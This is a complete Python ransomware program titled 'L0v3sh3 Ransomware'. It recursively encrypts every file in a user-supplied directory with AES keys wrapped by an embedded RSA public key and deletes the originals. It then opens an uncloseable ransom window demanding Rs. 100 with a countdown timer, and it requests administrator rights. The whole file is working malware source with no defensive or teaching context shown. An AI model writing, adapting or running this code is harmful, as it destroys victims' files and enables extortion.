
import os
from pathlib import Path
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP, AES
import tkinter as tk
from pyuac import main_requires_admin


pubKey = """
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAlI8SilXg/eleSXl8+MRI
ptS6UOi2eAgTU6qJoNXCMGIkEG7af0tyLhCNk3xF+fghHXZLqiv6vObJOST/mJGW
fSpK09+X7VpUYUdES5rY2uAB9ALSnF4uHWXOnmw2PUALk3KBjCO6WJVT6EJrfElI
d/s4xN1bgjJlKU735EMTMAd0pQj0yS8hCqaXt8leDLtDkpCT51juDgwycLFNxUuX
KJnMjTFte1LPJga7um/0K2eR7A1WRHSZNYN3DMnTiPBiM0eJBeKc1aig3s3eK6xH
K5gE16tuunFuRgaBjP+EB9brVlhnrge0/AHUE+CJtQd5U6yoEf3uR3qz8B0M0T6a
JwIDAQAB
-----END PUBLIC KEY-----
"""


def scanRecurse(baseDir):
    for entry in os.scandir(baseDir):
        if entry.is_file():
            yield entry
        else:
            yield from scanRecurse(entry.path)


def encrypt(dataFile, publicKey):
    extension = dataFile.suffix.lower()
    dataFile = str(dataFile)
    with open(dataFile, 'rb') as f:
        data = f.read()
    
    data = bytes(data)

    key = RSA.import_key(publicKey)
    sessionKey = os.urandom(16)

    cipher = PKCS1_OAEP.new(key)
    encryptedSessionKey = cipher.encrypt(sessionKey)

    cipher = AES.new(sessionKey, AES.MODE_EAX)
    ciphertext, tag = cipher.encrypt_and_digest(data)
    fileName= dataFile.split(extension)[0]
    fileExtension = '.L0v3sh3'
    encryptedFile = fileName + extension + fileExtension
    with open(encryptedFile, 'wb') as f:
        [ f.write(x) for x in (encryptedSessionKey, cipher.nonce, tag, ciphertext) ]
    os.remove(dataFile)


def countdown(count):
    hour, minute, second = count.split(':')
    hour = int(hour)
    minute = int(minute)
    second = int(second)
    label['text'] = '{}:{}:{}'.format(hour, minute, second)
    if second > 0 or minute > 0 or hour > 0:
        if second > 0:
            second -= 1
        elif minute > 0:
            minute -= 1
            second = 59
        elif hour > 0:
            hour -= 1
            minute = 59
            second = 59
        root.after(1000, countdown, '{}:{}:{}'.format(hour, minute, second)) 

root = tk.Tk()
root.title('L0v3sh3 Ransomware')
root.geometry('500x300')
root.resizable(False, False)
label1 = tk.Label(root, text='Your files are encrypted!! Pay me me Rs. 100 to decrypt\n\n', font=('calibri', 12,'bold'))
label1.pack()
label = tk.Label(root,font=('calibri', 50,'bold'), fg='white', bg='blue')
label.pack()

def disable_window_close():
    pass

root.protocol("WM_DELETE_WINDOW", disable_window_close)


@main_requires_admin
def main():
    dir = input("Enter the directory name you want to encrypt: ")
    if not os.path.isdir(dir):
        main()
    excludeExtension = [] # CHANGE THIS
    for item in scanRecurse(dir): 
        filePath = Path(item)
        fileType = filePath.suffix.lower()

        if fileType in excludeExtension:
            continue
        encrypt(filePath, pubKey)
    countdown('01:30:00')
    root.mainloop()
    
if __name__ == "__main__":
    main()